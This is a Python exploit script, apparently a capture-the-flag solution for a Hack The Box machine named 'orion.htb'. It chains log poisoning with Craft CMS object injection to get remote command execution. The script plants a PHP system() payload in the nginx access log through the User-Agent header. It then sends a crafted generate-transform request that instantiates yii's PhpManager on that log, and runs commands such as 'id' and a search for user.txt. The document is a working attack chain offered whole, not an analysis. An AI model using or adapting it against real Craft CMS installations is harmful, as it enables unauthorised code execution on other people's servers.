#!/usr/bin/env python3
import socket, sys, re, json, time
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def run_cmd(cmd):
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    # 간단한 PHP - 명령만 실행
    php = f"<?php system('{cmd}'); ?>"
    print(f"[DEBUG] Poison with UA ({len(php)} bytes): {php[:80]}", file=sys.stderr)
    s.get(f"{TARGET}/", headers={"User-Agent": php})
    time.sleep(0.3)

    payload = {
        "assetId": 2,
        "handle": {"width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})

    print(f"[DEBUG] Response status: {r.status_code}, len: {len(r.text)}", file=sys.stderr)

    # 마지막 1000 자 출력 (access.log의 마지막 부분)
    return r.text[-1500:]

# 테스트
print("=== ls /home ===")
print(run_cmd("ls /home"))

print("\n=== find user.txt ===")
print(run_cmd("find /home -name '*.txt' 2>/dev/null"))

print("\n=== id ===")
print(run_cmd("id"))
